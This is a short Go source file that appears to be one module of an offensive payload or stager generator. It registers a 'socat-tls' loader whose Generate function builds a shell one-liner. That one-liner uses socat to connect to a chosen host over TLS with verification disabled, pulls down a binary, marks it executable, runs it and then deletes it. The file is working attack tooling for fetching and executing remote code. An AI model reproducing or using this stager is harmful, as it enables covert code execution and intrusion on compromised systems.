package loader

import "fmt"

type socatTLS struct{}

func init() { Register(&socatTLS{}) }

func (s *socatTLS) Name() string        { return "socat-tls" }
func (s *socatTLS) Description() string { return "socat OPENSSL pull + exec (raw TLS listener)" }
func (s *socatTLS) RequiresTool() string { return "socat" }

func (s *socatTLS) Supports(os, arch string) bool {
	return os == "linux" || os == "unknown"
}

func (s *socatTLS) Generate(opts StagerOpts) (string, error) {
	if err := ValidateOpts(opts); err != nil {
		return "", err
	}
	return fmt.Sprintf(
		`f=$(mktemp);(printf '%%s\n' '%s';sleep 1)|socat - OPENSSL:%s:%s,verify=0 >$f;chmod +x $f;$f;rm -f $f`,
		opts.Token, opts.Host, opts.Port,
	), nil
}
